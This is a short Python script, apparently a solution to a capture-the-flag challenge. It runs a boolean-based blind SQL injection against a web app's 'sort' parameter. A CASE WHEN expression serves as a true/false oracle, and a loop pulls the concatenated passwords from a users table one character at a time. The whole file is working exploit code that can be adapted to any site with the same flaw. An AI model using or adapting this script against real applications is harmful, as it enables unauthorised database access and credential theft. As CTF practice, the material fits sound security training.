import requests
import string
from bs4 import BeautifulSoup

def oracle(payload):

    url = "http://top-lang.c.ctf-snyk.io/"
    sort_param = f"(CASE WHEN {payload} THEN rating ELSE change END)"
    params = {"sort": sort_param}
    r = requests.get(url, params=params)
    soup = BeautifulSoup(r.text, 'html.parser')

    return (soup.find_all("td")[2].get_text() == "Go")

#print(oracle("1=1")) # should be GO
#print(oracle("1=0")) # should be C

# SQL Statement we want to deal with:
#test= "(select (SELECT SUBSTR(tbl_name,1,1) FROM sqlite_master WHERE type='table' LIMIT 1)='A')"

#print(oracle(test))

info = ""
curr_iter = 1
charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + ";"

not_ended = True

while not_ended:
    for c in charset:
        tmp_info = info + c
        payload = f"(SELECT (SELECT SUBSTR(GROUP_CONCAT(password, ';'),1,{curr_iter}) FROM users)='{tmp_info}')"
        if oracle(payload):
            curr_iter += 1
            info = tmp_info
            print(f"password info enumerated so far: {info}")
            break
        if c == charset[-1]:
            print("End of enumeration")
            not_ended = False
            break

       
